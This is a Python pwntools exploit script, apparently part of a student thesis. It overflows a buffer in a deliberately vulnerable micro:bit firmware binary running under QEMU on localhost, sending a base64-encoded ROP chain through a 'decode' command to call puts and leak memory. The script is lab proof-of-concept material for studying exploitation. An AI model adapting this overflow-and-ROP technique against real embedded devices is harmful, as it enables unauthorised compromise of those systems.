#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *
import base64

# Set up pwntools for the correct architecture
context.update(arch='arm')
exe = 'qemu-system-arm'
context.terminal = ['tmux', 'new-window']
argv = ['-s','-machine', 'microbit', '-device', 'loader,file=/ctf/work/tests/test_vuln/bin/microbit/ctf.elf', '-nographic']
env = {}

elf = ELF("bin/microbit/ctf.elf")

'''
/home/h0ps/Uni/BachelorArbeit/tests/test_vuln

qemu-system-arm -machine microbit -device loader,file=/home/h0ps/Uni/BachelorArbeit/tests/test_vuln/bin/microbit/ctf.elf -nographic
'''

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

def decode(data, ln, amnt):
    buf = b"decode "
    buf += data
    buf += b" "
    buf += str(ln).encode()
    buf += b" "
    buf += str(amnt).encode()
    buf += b" \x0d"
    io.sendafter("> ", buf)

def encode(data, ln):
    buf = b"encode "
    buf += data
    buf += b" "
    buf += str(ln).encode()
    buf += b" \x0d"
    io.sendafter("> ", buf)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start(argv, env=env)

# pop {r0, r1, r4, pc};
g1 = 0x1cb3

buf = b"Z"*0x1a
rop = base64.b64encode(
        p32(0x42)*0x6 +
        p32(g1) +
        p32(0x10000) + 
        p32(0x42) +
        p32(0x42) +
        p32(elf.sym['puts']))
buf += rop
decode(buf, 0x17, 0x2)

io.interactive()

